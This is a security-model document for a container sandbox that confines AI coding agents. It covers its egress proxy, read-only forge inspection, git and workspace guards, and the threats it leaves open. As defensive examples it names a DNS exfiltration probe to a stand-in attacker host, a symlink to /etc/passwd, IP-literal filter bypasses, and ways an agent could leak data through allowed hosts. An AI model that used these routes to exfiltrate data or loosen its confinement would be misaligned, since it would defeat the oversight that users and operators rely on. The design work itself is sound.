# Security model

This document describes what the setup defends against, how, and what it does not.

The accompanying README opens with a diagram of the boundary this file reasons about,
the rest of the repository describes mechanism, and
the launcher (`src/main/scala/`, with `AgentSandboxLauncher.scala` the flow and its neighbours one
concern each) remains the canonical description of the mounts and flags that implement it.

The instructions to the agents are separate at `container/ko-agent-sandbox/SANDBOX.md`.

## Defended

**Compromise the host workstation.** The host exposes only the project directory and the
agent-state volume, and the rootless sandbox container has no route to root inside it.
`$HOME` and `/tmp` inside are writable but die with the session.

**Credential theft.** There is little to steal: forge tokens, SSH keys and cloud credentials are
never mounted — everything credentialed happens on the host (the README's private-repository
workflow generalizes: push, publish, deploy, administer). The one exception is the agents' own
provider logins, kept in the persistent volume because no agent functions without them.

**Project data reaching a destination nobody chose.** The only path out is the proxy,
which admits an exact list of hostnames and logs every attempt ("Egress proxy" below).

**Writing to a forge.** The allowlist has to admit GitHub, GitLab and Codeberg for reading, so the
proxy inspects those hosts and permits reading only ("Reading a forge without being able to write"
below has the rules, the costs, and what they do not cover).

**Being used to attack someone else.** The same allowlist. The agent cannot reach an arbitrary host,
an arbitrary port, or a private address — cloud metadata services such as 169.254.169.254 included.

**One session affecting the next, or another project.** Agent state is a per-project volume, the
rest of the sandbox home is discarded on exit, and Claude Code's hooks are disabled (the sandbox
Containerfile's `disableAllHooks` note has the reasoning). The networks and the proxy are per
sandbox run, created by the launch and removed with it — so concurrent sessions cannot reach one
another either, and nothing network-shaped is ever reused from an earlier run.

**A project loosening its own confinement.** Managed settings sit in the read-only image at the
highest precedence, so a repository's own settings cannot weaken them.
`/workspace/.ko-agent-sandbox` is mounted read-only, and the egress policy in it is read on the host
before the container starts.

**The host's git executing what the sandbox wrote.** Host `git` runs what `.git` configures:
hooks, and commands named in `.git/config` — `core.hooksPath`, `core.fsmonitor`, filters, the pager.
Both are remounted read-only into the sandbox (a pointer-file `.git` is pinned whole, and so is the
bare name when no repository exists), so a session cannot turn the user's next `git status` on the
host into code execution. The guard's shape is fixed at launch: a repository created on the
host mid-session appears inside behind the whole-directory pin, read-only until the next launch, so
later changes can only tighten the mount, never loosen it. What stays writable in `.git` is data.

The pin covers the repository at the workspace root — the one host git discovers from the project
directory. A repository the agent creates deeper in the tree is not pinned; that residue is under
"The project checkout", below.

The pin is now the fallback rather than the mechanism: by default `/workspace` is presented
through the workspace FUSE filter, which refuses a `.git` entry at any depth and so has no such
root-only limit. What the filter does not yet have on every platform is evidence — see "The
workspace filter", below. `KO_AGENT_SANDBOX_NO_FUSE_FILTER=1` returns a session to the pin.

**Silent changes to what you own.** The launcher never silently modifies configuration or files it
does not own — a security property, not politeness: a change you were not conscious of is one you
cannot account for when reasoning about your own system. Enumerated, because each entry is a place
a shortcut would be tempting:

- the Podman **machine's** `/etc/fuse.conf` gains `user_allow_other` only after `--build` shows the
  change as a diff of the actual file plus the exact script, and you consent; the original is saved
  to `/etc/fuse.conf.ko-agent-sandbox.orig` first, and declining prints the script for you to run
  yourself;
- a native Linux **host** is never even prompted for sudo — only handed the command;
- the **machine** is started when stopped, but never created or resized: sizing is yours;
- the **project tree** is never written by the launcher, with two enumerated exceptions, both
  empty directories that read-only guard mounts require. An empty `.ko-agent-sandbox`, created
  when absent because its read-only mount must exist on every launch — without it a session could
  write the egress policy governing the next one. And in a project with no repository, an empty
  `.git`: the launcher binds its own empty directory read-only over that name (so a sandbox cannot
  fabricate a repository for host git to discover), and the container runtime creates the mount
  target it needs in the project. The filter needs no such mount target, denying `.git` creation
  itself, so the empty `.git` appears only for a session that opted out of it;
  `.ko-agent-sandbox` is every session's.

What the launcher does write, it owns: its images, containers, networks and named volumes, its
per-project state root, and its install directory `~/.local/share/ko-agent-sandbox`.

## Not defended

**Prompt injection.** Nothing here stops the agent being persuaded. The boundary limits what the
consequence can be; it does not notice the attempt.

**Exfiltration through an allowed host.** The allowlist names destinations, not operations, so for
most of the list a host reachable for reading is reachable for writing if it has a write API;
`api.anthropic.com` receives the conversation by design. The forge hosts are the exception, and the
one place where an operation is named rather than a destination: the proxy terminates their TLS and
permits reading only, described below. That bounds the method and the path, not what a permitted
read can be pointed at — a `GET` still carries its URL, and a URL is a message. A project whose
checkout holds a forge token should still remove that forge's host in its own `egress-hosts`.

**The web reached through the model provider.** Claude Code's WebSearch and Codex's web search run
on the provider's servers: the query and its results travel inside the model-endpoint tunnel, and
the provider's infrastructure does the searching. The proxy sees one connection to
`api.anthropic.com` or `chatgpt.com`, so neither the allowlist nor the audit log (`--proxy-log`)
applies to the domains searched — a query is outbound information the provider relays onward.
Claude Code's WebFetch is the opposite: a direct request from inside the sandbox, through the
proxy, answered only by an allowed host and logged like any other connection.

**Low-bandwidth channels.** Which allowed host is contacted, when, and in what order all carry
information. Nothing measures that.

**The project checkout.** `/workspace` is writable on purpose: the sandbox protects the rest of the
host, not the repository. With `.git`'s config and hooks pinned read-only (above), what an
agent can still write there is data which your git then parses, so a
memory-safety bug in git itself remains reachable, exactly as with any cloned untrusted repository
(`.gitattributes` stays writable, but can only invoke filter commands your host configuration
already defines). Treat a sandboxed repository as hostile data, not hostile configuration.

Everything else writable — build scripts, CI definitions, IDE configuration, generators, binaries —
is output from an untrusted execution environment: editing them is the job, and confining their
author says nothing about what running them on the host will do. Review the diff first, exactly as
for a contribution from a stranger. That includes a repository the agent created deeper in the
tree: its config and hooks are unpinned, so running host git *inside* it is running the agent's
output.

A symlink is the sharpest case of that, because its meaning changes with the namespace reading it.
`/workspace/x -> /etc/passwd` written inside resolves to the *container's* `/etc/passwd`, and a
relative `../../..` clamps at the container root, so from in there it reaches nothing the sandbox
did not already expose. On the host the identical link resolves to the host's file, outside the
project directory the boundary is drawn around — and it fires not when the agent writes it but
whenever something later follows it: `grep -r`, `tar`, `cp -rL`, an editor indexing the project, a
packaging step. It is also where "review the diff" is weakest, since the diff is one innocuous line
of target text. The workspace filter does not change this: `RESOLVE_IN_ROOT` clamps traversal
*through the mount*, but creating the link is only writing a string, and the host-side meaning is
untouched. Hardlinks need no such care — `/workspace` and the container's root are different
filesystems, so `link` across the boundary is `EXDEV` in both directions.

The tree is also shared live with the host: your editor, builds and git run against the same files
the agent is writing, host and sandbox writes race like any two processes on one directory, and
git's own lock files are the only arbiter the writable parts of `.git` get. Concurrent sandbox
sessions of one project race each other the same way — under the workspace filter too, where they
share the one filter mount: the same files, the same live view, the same races.

**The workspace filter, on the platforms where it is unverified.**
`/workspace` reaches the sandbox through `ko-agent-fs` (`fuse/ko-agent-fs/`), a FUSE filter that
presents it behind a policy layer: no entry named `.git` — under any
spelling a case-insensitive backing filesystem folds to it — can be created at any depth, and
inside a repository the control state (config, hooks, the redirection files, rebase todo) is
immutable while operational state stays writable, so the agent's own git keeps working. That closes
what the pin cannot: repositories planted or nested below the workspace root. AppArmor could
express a similar policy but the default Podman machine images (Fedora-based) do not provide it,
which is why the filter is a FUSE layer: it works wherever the VM does.

One residue stays yours to know about. A repository whose hooks *you* have relocated into the
worktree — a `.git/hooks` symlink, or a `core.hooksPath` naming a worktree directory — is refused at
mount, because those files sit at an ordinary path the filter must keep writable. That check is a
snapshot: relocate them mid-session and this session will not notice, and the sandbox may write them
from then on. It cannot cause the relocation (`.git/config` is frozen and the `.git/hooks` node is
immutable), so the window only opens if you open it.

What an auditor trusts, and how each link is checked:

- **The source.** No binary is shipped: the Rust source travels inside the launcher jar, readable
  in this repository, and `--build` compiles it in a pinned `rust:slim` container on the user's
  own machine.
- **The dependency tree**, pinned by `Cargo.lock` (`--locked` at every cargo step) and gated by a
  pinned `cargo-deny` — permissive licences only — before any binary exists.
- **The installed binary's identity.** The launcher digests the bundled source, passes the digest
  into the image build, and requires the installed binary's `--version` to echo it back; a binary
  that is not the one this launcher's source builds fails `--build` rather than being trusted.
- **No new privilege.** Installed into the Podman machine's user home on macOS and Windows, the
  host user's on native Linux (the README names the path), it mounts as an ordinary user through
  the setuid `fusermount3`: no root, no capabilities, no system daemon. The one root-assisted
  step — `user_allow_other` in the machine's `/etc/fuse.conf`, required for a cross-uid FUSE
  mount — is consent-gated ("Silent changes to what you own", above).

Its name rule and its coherency are verified on macOS, against APFS case-insensitive — the
default volume format — through the whole production stack. On Linux and Windows they are not,
and that is what the README's status line means: the filter is every session's enforcement on
every platform, but on those backings its guarantees are reasoned rather than measured.

`KO_AGENT_SANDBOX_NO_FUSE_FILTER=1` is the way back to the mount pin above, and a session that
takes it says so on its first line. The two are alternatives, never a stack: the filter's policy
is a strict superset of the pin's, and preparing the pin's bind targets would mean creating
`.git` entries through the filter, which the filter denies. Every gate on the filtered path fails
closed — a version mismatch, a failed self-test or a failed mount aborts the launch, never
falling back to an unfiltered bind. Mechanics, policy derivation and test evidence:
`fuse/ko-agent-fs/docs/`.

**What is inside TLS, everywhere except the forges.** For every other allowed host the proxy sees
only the handshake: it cannot tell a `GET` from a `POST` and does not try. That is deliberate rather
than pending. Inspecting `api.anthropic.com` would mean reading the conversation in clear inside the
proxy, and inspecting a package registry would buy nothing — the payload is an archive that gets
executed either way.

**What the persistent volume carries.** It is read back every time the project opens, and some of
what it holds — MCP server definitions especially — names commands to run. Treat it as trusted
input; reset it if a project is suspect. `KO_AGENT_SANDBOX_PERSISTENT_VOLUME` shares one volume
across every project, trading that isolation for signing in once: what a session of one repository
writes there becomes startup input to every other's.

Concurrent sessions of a project mount it read-write together: state files race, last writer wins —
same repository, same trust domain, so a data-integrity caveat, not a new trust edge. A `--reset`
from another terminal ends live sessions by design; one racing a launch mid-start fails that launch
loudly rather than weakening it.

**A repository that ships a wide egress policy.** Reading `.ko-agent-sandbox/egress-hosts` before
running an unfamiliar project is the user's job, exactly like reading its build scripts.

**The supply chain.** Base images, the JDK, and whatever `cs`, `uvx` or `npx` fetches at the
agent's request are trusted as they arrive.

**Container, runtime and kernel escape.** On Linux the boundary ultimately rests on rootless Podman,
the OCI runtime, namespaces, seccomp and the host kernel. This design is not built to contain a
working kernel or container-runtime exploit; if that enters the threat model, the answer is a
stronger isolation layer (gVisor, a microVM), bought at its compatibility cost, not more flags here.

**Resource exhaustion.** The PID limit and the opt-in memory ceiling bound the two runaways this
environment actually invites. CPU, disk growth under `/workspace`, network bandwidth, and denial of
service against the host generally are not comprehensively bounded.

## Egress proxy

An HTTP proxy in its own container, so the policy is enforced somewhere the agent cannot
edit, on the far side of a network the agent cannot route out of. The container is created per
sandbox run and removed when the run ends — in `podman ps` a run's containers are
`ko-agent-egress-proxy-<directory>-<hash>-<run>` and `ko-agent-sandbox-run-<...>`, in
`podman network ls` its networks `ko-agent-sandbox-<...>` and `ko-agent-egress-<...>`. Its log —
every allow and every refusal — is appended through a bind mount to a per-run file in the
launcher's state directory on the host, so the audit record does not share the container's
lifetime. Every connection has to pass all of this, in order:

1. `CONNECT` only — any other method is a 400
1. port 443 only
1. IP-literal targets are refused — not just dotted-quads: the resolver also accepts `127.1`,
   `0177.0.0.1` and `2130706433` as spellings of `127.0.0.1`, and a match on the first form alone
   is a known bypass class
1. the hostname matches the allowlist exactly — no wildcards, no suffixes
1. DNS is resolved once, and the connection is made to that resolved address, so no second lookup
   can return a different answer
1. every address the name resolved to must be a public one — a name that answers with a loopback or
   RFC1918 address is refused outright
1. `200 Connection Established` — the reply that accepts a `CONNECT`, and the last HTTP the proxy
   speaks on this connection; from here on the bytes are the client's TLS, not HTTP
1. the client's TLS ClientHello is parsed within a fixed byte budget
1. Encrypted ClientHello is refused: it would hide the name that actually selects a backend
1. SNI must be present, and must equal the hostname in the `CONNECT`
1. only then does it become a tunnel — opaque for most hosts, inspected for the forges

Steps 8-11 are what stops `CONNECT allowed.example:443` from being used to speak TLS to something
else behind the same address. They happen after the `200`, so a failure there closes the connection
rather than answering with a status the client would no longer accept.

### Reading a forge without being able to write

1. `github.com`
1. `raw.githubusercontent.com`
1. `objects.githubusercontent.com`
1. `codeload.github.com`
1. `api.github.com`
1. `codeberg.org`
1. `gitlab.com`

are on the default allowlist because agents genuinely need to read them:
issues, release notes, upstream sources, `git clone`. An opaque tunnel
to those hosts is also the shortest path out for the contents of `/workspace`, since the same tunnel
carries `git push`.

So for those sites the proxy terminates TLS and applies a second, narrower policy to the request
inside it:

- `GET` and `HEAD` to any path — the whole of the read surface
- `POST` to a path ending `/git-upload-pack` — the transfer step of `clone` and `fetch`: after
  discovering refs with a `GET`, git sends its wants as a `POST` and the packfile comes back in the
  response. A download that travels as a `POST`, so a GET/HEAD-only policy would still read as
  "reads allowed" while every `git clone https://…` failed
- Nothing else. `POST .../git-receive-pack` is the push and is refused, as is its ref discovery — a
  `GET`, refused anyway so that `git push` fails at its first request rather than its second. `PUT`,
  `PATCH` and `DELETE` are refused, and so is every other `POST`

The refusal is a `403` inside the tunnel with the reason in it, and a line in the proxy's log naming
the method and path. That log is the other half of what this buys: what an agent asked a forge to do
is now recorded, not merely whether it opened a connection.

Two consequences:

- The GraphQL endpoints are a `POST` even to read: a query and a mutation are the same request
  shape, telling them apart means reading the body, and this proxy does not. GraphQL is therefore
  refused; the REST read endpoints are not. On GitHub that costs nothing — its GraphQL API has no
  unauthenticated tier, and the sandbox carries no forge credential by design. GitLab's answers
  anonymously, so the cost is real there; its REST API still reads with `GET`s. (Codeberg's
  Forgejo has no GraphQL API, so those two are the whole cost.)
- The LFS batch endpoint is not opened. It is a `POST` whose body chooses between download and
  upload — another request whose meaning is in the body. Unlike GraphQL, this refusal is what
  actually stops something: LFS batch downloads on public repositories are anonymous, and git-lfs
  being absent from the image is no boundary — it is one static binary an agent can fetch through
  release-assets.githubusercontent.com, and it then fails here. What it costs is bulk transfer (`git
  lfs pull`), not the content: media.githubusercontent.com is on the allowlist, and GitHub serves
  LFS file contents there read-only, one URL per file — the API's `download_url` for an LFS-tracked
  file points at it. (That escape hatch is GitHub's; GitLab has no equivalent read-only host, so LFS
  content hosted there stays out of reach.) TODO.md records the download-only inspection that would
  reopen bulk transfer.

The session is one request and its response, then the connection closes. That is what lets the proxy
avoid agreeing with the origin server about where a message ends, which is precisely what request
smuggling exploits: the request body is framed once and forwarded, the proxy then stops reading from
the client entirely, and `Connection: close` upstream makes end-of-stream the end of the response.
Ambiguous framings — a `Content-Length` beside a `Transfer-Encoding`, two `Content-Length`s that
disagree — are refused rather than resolved. ALPN is pinned to `http/1.1` so the request is one the
proxy can read at all.

### Who holds the CA key

The launcher, on the host, and nothing else.

Each project gets its own CA, created under `~/.local/state/ko-agent-sandbox/tls/<project>`
(`%LOCALAPPDATA%` on Windows) — outside `/workspace`, so the agent can neither read the key that
signs what it is shown nor replace it for the next session. A CA minted for one project cannot be
used to read another's traffic.

What reaches the proxy container is one leaf certificate and that leaf's own key, bind-mounted
read-only. The leaf names exactly the forge hosts above, and the proxy refuses
to start unless its certificate names exactly its own built-in inspected set, so the two lists
cannot drift apart silently in either direction: a leaf missing a name would surface as an
inexplicable TLS error inside the sandbox, and one naming an extra host means the launcher expected
an inspection the proxy would not perform — that host would have been an opaque, writable tunnel.

The sandbox trusts that CA through a bundle assembled on the host from the image's own CA bundle
plus this project's CA, mounted over `/etc/ssl/certs/ca-certificates.crt`. `SSL_CERT_FILE`,
`CURL_CA_BUNDLE`, `REQUESTS_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS` and `GIT_SSL_CAINFO` point at the same
file, for the tools that carry their own trust store rather than reading the system one.

The image's JDK is covered by the same technique one layer over, because it reads none of the
above: a JVM consults a `cacerts` keystore, so the launcher takes the image's own store, adds this
project's CA, and mounts the result read-only over `$JAVA_HOME/lib/security/cacerts` — with
`JAVA_HOME` read from the image's own environment, so the launcher never hardcodes the
arch-dependent Temurin directory and an image without a JDK simply skips the mount. The store is
written back in the format it arrived in, and every root the image shipped survives the merge:
dropping one would be the failure that stays invisible until something needs a public CA, so it is
what the merge is tested on. Merged at launch rather than baked in, since the per-project CA
postdates the image.

Two kinds of program stay outside all of it, neither reachable from the launcher. A JVM the agent
installs itself (`cs java --jvm ...`) brings its own untouched store — the image ships
`ko-agent-sandbox-trust-ca`, which adds the CA to one such JDK from inside, so the gap is one
command rather than a dead end; the certificate it reads is mounted beside the agent instructions,
and is the same public one already inside the bundle. And a statically linked binary keeps its
compiled-in roots — the Codex CLI, which talks only to uninspected OpenAI.

### Why the policy is per project, in the project, and read-only

A host-wide allowlist has to be the union of what every project needs — the widest policy,
applied everywhere, permanently. Per project, a repository that reads public documentation and one
holding credentials get different answers, and the answer is reviewed in a pull request like any
other file.

`/workspace` is writable, so the policy file would be the agent's to rewrite for the next session.
The launcher therefore mounts `.ko-agent-sandbox` back over itself read-only — creating the
directory on the host first when the project ships none, so the mount point exists on every launch —
which also makes it a mount point: it cannot be written, deleted or replaced from inside the
container. A symlinked policy directory, or anything other than a directory in its place, is refused
rather than mounted, so what is mounted is what was reviewed. What remains is "A repository that
ships a wide egress policy", above.

### Adding hosts, not patterns

The policy file comes in two forms, a whole-list replacement or a delta of `+host` / `-host` lines
against the built-in list. Additions name exact hostnames; the one wildcard is `-**.domain` on the
removal side. That asymmetry is the security choice.

A wildcard *grant* is an unenumerable reach, the opposite of what the allowlist is for: every entry
is meant to be a destination someone reviewed and chose. `+*.example.com` would not mean "the site"
— it means every name under it, including ones added later, and for a shared apex like a cloud
provider's, names an attacker can register or take over. The breadth is in the grant, not the
matcher, so no careful pattern syntax removes it. It would also quietly undo the forge rule: the
proxy picks the hosts to TLS-inspect by intersecting the allowlist with its forge list, name by
name, so a pattern that admits a forge host without literally naming it passes admission but
misses that intersection — the connection gets the opaque, writable tunnel, `git push` and all,
with nothing failing to warn anyone. So additions stay exact.

A wildcard *removal* is the mirror image: it only ever shrinks the allowlist, so its worst case is
over-blocking something wanted — fail-closed — never reaching something new. `-**.foo.com` drops
`foo.com` and every host under it (the dot is part of the pattern, so never `barfoo.com`), which is
the concise way to drop a provider that ships several subdomains in the built-in list without
re-listing the whole thing. The failure a removal *can* have is the opposite of a grant's: a typo
that matches nothing would leave a default in place while reading as though it were dropped. That is
closed by refusing any removal — exact or `**` — that matches nothing in the built-in list, so a
misspelling is a failed launch, not a silent non-narrowing.

The delta form fails closed on every other ambiguity too: a file is all-delta or all-replacement and
mixing is refused, and a host cannot be both added and removed — including a `+host` that falls
under a `-**.domain`, which is a contradiction rather than a precedence to resolve (the
allow-versus-deny ordering that egress proxies get wrong is a bug family we keep out by having no
ordering). The one no-op that is allowed is deliberate: a `+` for a host already built in, so a
policy that names a host defensively keeps working when a later image adopts it. The cost is that a
delta file is not self-contained; the README's `--proxy-allowed` bullet is the mitigation.

### Why the policy is not a capability system

The allowlist names destinations, and the forge rules name one operation; nothing grants
`GitRead(owner/repo)`-style capabilities. Deliberate: public reading is meant to be broad —
discovering and reading arbitrary public repositories is much of what the agents are for — and the
sandbox carries no credential whose authority a finer grant would attenuate ("Credential theft",
above). The one distinction that matters at a forge, reading versus writing, is already
enforced in the protocol. Nor would capabilities fix exfiltration: a permitted read still carries
its URL ("Exfiltration through an allowed host", above). What a capability vocabulary would add is a
second policy language whose semantics must stay correct across every layer that reads it —
precisely where richer sandbox policies fail in the field. Revisit only if an agent must someday
perform an operation inside the sandbox with a credential materially more powerful than that
operation.

### DNS

The sandbox runs with `--dns=none` and a single `--add-host` entry for the proxy. That is correct
rather than merely strict: with a proxy configured, curl, npm and uv send `CONNECT host:443` and
never resolve the destination themselves; the proxy does every lookup.

Podman 6.0.2 was measured on an `--internal` network: aardvark-dns answers for
container names and returns NXDOMAIN for everything else rather than forwarding it, so `getent hosts
$SECRET.attacker.example` never reaches a resolver that could log it:

    $ getent hosts egress-proxy
    10.89.1.2       egress-proxy.dns.podman
    $ python3 -c "import socket;print(socket.gethostbyname('example.com'))"
    socket.gaierror: [Errno -2] Name or service not known

The second line settles it: `example.com` exists in public DNS, so a forwarding resolver would have
returned an address. (`Errno -2` alone proves nothing — a forwarded NXDOMAIN looks identical; the
probe has to be a name that does exist.) The behaviour matches the source: aardvark-dns refuses to
forward for containers that are only on internal networks, and podman's `--cap-drop=ALL` is what
stops a container spoofing its way past that check.

What `--dns=none` adds is that the property no longer depends on that behaviour staying as it is,
and that the host's own DHCP search domains stop being copied into the container's `resolv.conf`.

## No containers inside the sandbox

Deliberate, both directions:

- **Nested** — a runtime inside the sandbox needs `/dev/net/tun`, `/dev/fuse` and, decisively,
  unmasking `/proc/kcore`, `/proc/keys` and friends, because a nested container cannot mount its own
  `/proc` while those locked overmounts are in place. The unmask would widen the host-kernel surface
  reachable from the same container that runs untrusted repository code, and single-uid nesting
  cannot run stock database images anyway.
- **Sibling** — a service container beside the sandbox would be a new host-level object with its own
  attack surface, reachable laterally from the sandbox and running outside its confinement.

What containers are usually wanted for here — a test database, an S3 endpoint — runs as ordinary
processes inside the sandbox instead, with the same uid, capabilities and egress confinement as
everything else: PostgreSQL rootless via `initdb`/`pg_ctl`, S3 via a JVM mock such as Adobe S3Mock.
`SANDBOX.md` points the agents the same way.
